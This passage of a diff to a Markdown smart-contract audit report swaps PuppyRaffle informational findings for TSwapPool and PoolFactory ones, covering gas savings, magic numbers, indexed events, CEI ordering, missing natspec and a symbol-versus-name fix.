+        revertIfDeadlinePassed(deadline)
+        returns (
+-           uint256 output
++           uint256 outputAmount
+        )
+    {
+        uint256 inputReserves = inputToken.balanceOf(address(this));
+        uint256 outputReserves = outputToken.balanceOf(address(this));
+
+        uint256 outputAmount = getOutputAmountBasedOnInput(inputAmount, inputReserves, outputReserves);
+
+        if (outputAmount < minOutputAmount) {
+            revert TSwapPool__OutputTooLow(outputAmount, minOutputAmount);
+        }
+
+        _swap(inputToken, inputAmount, outputToken, outputAmount);
+    }
+``` 
+
+
 
 ## Informational 
+### [I-1]: `public` functions not used internally should be marked `external`, to save gas. 
 
-### [I-1] Solidity pragma should be specific, not wide.
+Instead of marking a function as `public`, consider marking it as `external` if it is not used internally. 
 
-Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`
+- Found in src/TSwapPool.sol:
 
-- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)
-
-	```solidity
-	pragma solidity ^0.7.6;
+	```javascript
+	    function swapExactInput(
+        IERC20 inputToken,
+        uint256 inputAmount,
+        IERC20 outputToken,
+        uint256 minOutputAmount,
+        uint64 deadline
+    ) 
+    // The following line should be external.  
+    public
+        revertIfZero(inputAmount)
+        revertIfDeadlinePassed(deadline)
+        returns (uint256 output)
 	```
 
-### [I-2] Using outdated version of Solidity is not recommended. 
+### [I-2]: Avoid use of magic numbers: Define and use `constant` variables instead of using literals. 
 
-`solc` frequently releases new compiler versions. 
-Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.
-Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.
+Using `constant` variable increases readability of code and decreases chances of inadvertantly introducing errors. 
 
-**Recommended Mitigation:** 
-Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.
-Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.
+If the same constant literal value is used multiple times, create a constant state variable and reference it throughout the contract.
 
-Please see slither documentation for more information. 
-
-### [I-3] Missing checks for `address(0)` when assigning values to address state variables.
-
-Check for `address(0)` when assigning values to address state variables.
-
-- Found in src/PuppyRaffle.sol [Line: 70](src/PuppyRaffle.sol#L70)
-
-	```solidity
-	        feeAddress = _feeAddress;
+- Found in src/TSwapPool.sol:
+  
+	```javascript
+	        uint256 inputAmountMinusFee = inputAmount * 997;
 	```
 
-- Found in src/PuppyRaffle.sol [Line: 209](src/PuppyRaffle.sol#L209)
-
-	```solidity
-	        feeAddress = newFeeAddress;
+- Found in src/TSwapPool.sol:
+  
+	```javascript
+	        return ((inputReserves * outputAmount) * 10000) / ((outputReserves - outputAmount) * 997);
 	```
 
-### [I-4] `PuppyRaffle::selectWinner` should follow Check-Effect-Interact (CEI) layout, which is not best practice. 
+- Found in src/TSwapPool.sol:
+  
+	```javascript
+	        1e18, i_wethToken.balanceOf(address(this)), i_poolToken.balanceOf(address(this))
+	```
 
-It is best to code clean and follow CEI. 
+- Found in src/TSwapPool.sol:
+  
+	```javascript
+	        1e18, i_poolToken.balanceOf(address(this)), i_wethToken.balanceOf(address(this))
+	```
 
-```diff 
-+   _safeMint(winner, tokenId);
-    (bool success,) = winner.call{value: prizePool}("");
-    require(success, "PuppyRaffle: Failed to send prize pool to winner");
--   _safeMint(winner, tokenId);
-```
+- Found in src/TSwapPool.sol:
+  ```javascript
+	        uint256 denominator = (inputReserves * 1000) + inputAmountMinusFee;
+	```
 
-### [I-5] Use fo "magic" numbers discouraged. 
+### [I-3]: Large literal values multiples of 10000 can be replaced with scientific notation. Using scientific notation increases readability of code and decreases chances of inadvertantly introducing errors.
 
-It can be confusing to see number litera;s in a codebase, and it's much more readbale if the numbers are given a name.
+Use `e` notation, for example: `1e18`, instead of its full numeric value.
 
-Examples: 
+- Found in src/TSwapPool.sol:
+	```javascript
+	    uint256 private constant MINIMUM_WETH_LIQUIDITY = 1_000_000_000;
+	```
+
+- Found in src/TSwapPool.sol:
+	```javascript
+	        return ((inputReserves * outputAmount) * 10000) / ((outputReserves - outputAmount) * 997);
+	```
+
+- Found in src/TSwapPool.sol:
+	```javascript
+	            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
+	```
+
+### [I-4]: Unused Custom Error, remove to save gas. 
+
+It is recommended that the definition be removed when custom error is unused. 
+
+- Found in src/PoolFactory.sol: 
+
+	```javascript
+	    error PoolFactory__PoolDoesNotExist(address tokenAddress);
+	```
+
+### [I-5]: Absent address(0) check, include to avoid uncaught errors. 
+
+- Found in src/PoolFactory.sol: 
+  
+  ```javascript
+	  constructor(address wethToken) {
+        i_wethToken = wethToken;
+    }
+	```
+
+### [I-6]: Event is missing `indexed` fields.
+
+Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.
+
+- Found in src/PoolFactory.sol
+
+	```javascript
+	    event PoolCreated(address tokenAddress, address poolAddress);
+	```
+
+- Found in src/TSwapPool.sol 
+
+	```javascript
+	    event LiquidityAdded(address indexed liquidityProvider, uint256 wethDeposited, uint256 poolTokensDeposited);
+	```
+
+- Found in src/TSwapPool.sol 
+
+	```javascript
+	    event LiquidityRemoved(address indexed liquidityProvider, uint256 wethWithdrawn, uint256 poolTokensWithdrawn);
+	```
+
+- Found in src/TSwapPool.sol 
+
+	```javascript
+	    event Swap(address indexed swapper, IERC20 tokenIn, uint256 amountTokenIn, IERC20 tokenOut, uint256 amountTokenOut);
+	```
+
+### [I-7]: At `TSwapPool::deposit` the `poolTokenReserves` parameter is unused and can be removed to save gas.
+
 ```javascript
-    uint256 prizePool = (totalAmountCollected * 80) / 100;            
-    uint256 fee = (totalAmountCollected * 20) / 100;
+  int256 poolTokenReserves = i_poolToken.balanceOf(address(this));
 ```
 
-Instead you can use constant state variables: 
+### [I-8]: At `TSwapPool::deposit` it is better to set `liquidityTokensToMint` before `_addLiquidityMintAndTransfer` is called to follow CEI conventions. 
+
+- Found in src/TSwapPool.sol 
+  
+```diff
++    liquidityTokensToMint = wethToDeposit;
+    _addLiquidityMintAndTransfer(wethToDeposit, maximumPoolTokensToDeposit, wethToDeposit);
+-    liquidityTokensToMint = wethToDeposit;       
+```
+
+### [I-9]: Function `TSwapPool::swapExactInput` misses a natspec, please include to increase readbility of code and decrease chances of introrducing bugs. 
+
+Natspecs are meant to increase understanding of code for, both internal and external, developers working in the code base. Lacking natspecs increases the chance for introducing bugs due to poor understanding of code. 
+
+- Found in src/TSwapPool.sol 
 
 ```javascript 
-    uint256 public constant PRIZE_POOL_PERCENTAGE =  80; 
-    uint256 public constant FEE_PERCENTAGE = 20; 
-    uint256 public constant POOL_PRECISION = 100; 
+   function swapExactInput(
+``` 
+
+### [I-10]: Function `TSwapPool::totalLiquidityTokenSupply` should be set to external, to save gas.
+
+Any function only called externally, can be set to external to save gas. 
+
+- Found in src/TSwapPool.sol 
+
+```javascript 
+    function totalLiquidityTokenSupply() public view returns (uint256) {
+        return totalSupply();
+    }
 ```
 
-### [I-6] State changes are missing events. 
-It is best practice to emit an event every time the state of a contract is changed. `selectWinner` and `withdrawFees` are missing these event emissions. 
+### [I-11]: Function `PoolFactory::createPool`, the `liquidityTokenSymbol` should read from `.symbol()` not `.name()`.
 
-To mitigate this issue, please include emission of an event. See the `enterRaffle` as an example. 
-
-### [I-7] All events are missing indexed fields. 
-Index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.
-
-- Found in src/PuppyRaffle.sol [Line: 59](src/PuppyRaffle.sol#L59)
-
-	```solidity
-	    event RaffleEnter(address[] newPlayers);
-	```
-
-- Found in src/PuppyRaffle.sol [Line: 60](src/PuppyRaffle.sol#L60)
-
-	```solidity
-	    event RaffleRefunded(address player);
-	```
-
-- Found in src/PuppyRaffle.sol [Line: 61](src/PuppyRaffle.sol#L61)
-
-	```solidity
-	    event FeeAddressChanged(address newFeeAddress);
-	```
-
-### [I-8] `PuppyRaffle::_isActivePlayer` is never used and should be removed.
-Dead code in contracts should be avoided for the following reasons: 
-- Any unused code costs gas when deployed. 
-- Makes code less readible and thereby increases chance of security risks being overlooked. 
-  
-### [I-9] Documention does not mention there is a minimum of four players in the raffle.
-The `PuppyRaffle::selectWinner` function includes a check that there are at leats four players in the Raffle. This minimum amount of players is not mentioned in the documention. 
-
-```javascript
-    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
+```diff 
+    string memory liquidityTokenSymbol = string.concat("ts", 
+-      IERC20(tokenAddress).name()
++      IERC20(tokenAddress).symbol()
+    );
 ```
-
-Please add a statement that there is a minimum of four players to the documentation. 
-  
 
